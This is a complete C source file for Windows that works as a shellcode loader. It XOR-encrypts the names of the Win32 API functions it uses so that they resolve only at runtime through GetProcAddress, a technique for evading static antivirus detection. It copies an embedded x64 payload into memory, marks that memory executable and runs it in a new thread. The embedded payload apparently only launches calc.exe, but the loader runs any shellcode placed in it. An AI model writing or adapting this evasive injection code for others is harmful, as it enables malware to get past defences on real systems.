```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// debug macros
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)

// Win32API global variables
LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

void (WINAPI *pRtlMoveMemory)(void *Destination, const void *Source, size_t Length);

BOOL (WINAPI *pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

DWORD (WINAPI *pWaitForSingleObject)( HANDLE hHandle,  DWORD  dwMilliseconds);

int XOR(char * data, size_t data_len, char * key, size_t key_len){
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
	return EXIT_SUCCESS;
}	

const unsigned char payload[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
DWORD payload_len = sizeof(payload);



int main (void){

	void *exec_mem;
	HANDLE thread;
	BOOL update_mem;
	DWORD oldprotect = 0;
	HMODULE hKernel =  GetModuleHandleA("kernel32.dll");
	if (!hKernel){
		warn("failed to get handle to kernel32.dll");
	}
	HMODULE hNtdll =  GetModuleHandleA("Ntdll.dll");
	if (!hNtdll){
		warn("failed to get handle to ntdll.dll");
	}
	

	char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	
	char sVirtualAlloc[] = { 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x9, 0x25, 0x26, 0x24, 0x2f };
    DWORD sVirtualAlloc_len = sizeof(sVirtualAlloc);
	char sRtlMoveMemory[] = { 0x13, 0x36, 0x2f, 0x9, 0x2a, 0x30, 0x22, 0x5, 0x2c, 0x27, 0x24, 0x3e, 0x34 };
	DWORD sRtlMoveMemory_len = sizeof(sRtlMoveMemory);
	char sVirtualProtect[] = { 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a };
	DWORD sVirtualProtect_len = sizeof(sVirtualProtect);
	char sCreateThread[] ={ 0x2, 0x30, 0x26, 0x25, 0x31, 0x23, 0x13, 0x20, 0x3b, 0x2f, 0x2a, 0x28 };
	DWORD sCreateThread_len = sizeof(sCreateThread);
	char sWaitForSingleObject[] = { 0x16, 0x23, 0x2a, 0x30, 0x3, 0x29, 0x35, 0x1b, 0x20, 0x24, 0x2c, 0x20, 0x28, 0x1, 0x2d, 0x3a, 0x34, 0x31, 0x27 };
	DWORD sWaitForSingleObject_len = sizeof(sWaitForSingleObject);

	if ((XOR(sVirtualAlloc, sVirtualAlloc_len, key, sizeof(key))) != EXIT_SUCCESS){
		warn("failed to decrypt winapi 1 - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	sVirtualAlloc[sVirtualAlloc_len] = '\0';

	if ((XOR((char *) sRtlMoveMemory, sRtlMoveMemory_len, key, sizeof(key))) != EXIT_SUCCESS){
		warn("failed to decrypt winapi 2 - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	sRtlMoveMemory[sRtlMoveMemory_len] = '\0';

	if ((XOR((char *) sVirtualProtect, sVirtualProtect_len, key, sizeof(key))) != EXIT_SUCCESS){
		warn("failed to decrypt winapi 3 - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	sVirtualProtect[sVirtualProtect_len] = '\0';

	if ((XOR((char *) sCreateThread, sCreateThread_len, key, sizeof(key))) != EXIT_SUCCESS){
		warn("failed to decrypt winapi 4 - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	sCreateThread[sCreateThread_len] = '\0';

	if ((XOR((char *) sWaitForSingleObject, sWaitForSingleObject_len, key, sizeof(key))) != EXIT_SUCCESS){
		warn("failed to decrypt winapi 5 - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
	sWaitForSingleObject[sWaitForSingleObject_len] = '\0';

	info("win32apis decrypted");

	pVirtualAlloc = (LPVOID(WINAPI *)(LPVOID , SIZE_T, DWORD , DWORD ))GetProcAddress(hKernel, sVirtualAlloc);	
	//pVirtualAlloc = GetProcAddress(hKernel, "VirtualAlloc");

	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!exec_mem){
		warn("failed to allocate buffer - 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}

	okay("allocated buffer:\t 0x%p", (void *)exec_mem);

	pRtlMoveMemory = (void (WINAPI *)(void *, const void *, size_t ))GetProcAddress(hKernel, sRtlMoveMemory);
	//pRtlMoveMemory = GetProcAddress(hKernel, sRtlMoveMemory);
	

	pRtlMoveMemory(exec_mem, payload, payload_len);
	if (!pRtlMoveMemory){
		warn("failed to copy payload to buffer - 0x%lx", GetLastError());
	}
	okay("copied payload to buffer");

	pVirtualProtect = (BOOL (WINAPI *)(LPVOID , SIZE_T , DWORD  , PDWORD ))GetProcAddress(hKernel, sVirtualProtect);
	//pVirtualProtect = GetProcAddress(hKernel, sVirtualProtect);

	update_mem = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	okay("udpated mem protection to PAGE_EXECUTE_WRITE");

	pCreateThread = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(hKernel, sCreateThread);
	// pCreateThread = GetProcAddress(hKernel, sCreateThread);
	pWaitForSingleObject = (DWORD (WINAPI *)(HANDLE ,DWORD))GetProcAddress(hKernel, sWaitForSingleObject);

	if (update_mem != 0){
		info("Bang!");
		thread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		pWaitForSingleObject(thread, -1);
	}

	return EXIT_SUCCESS;
}
```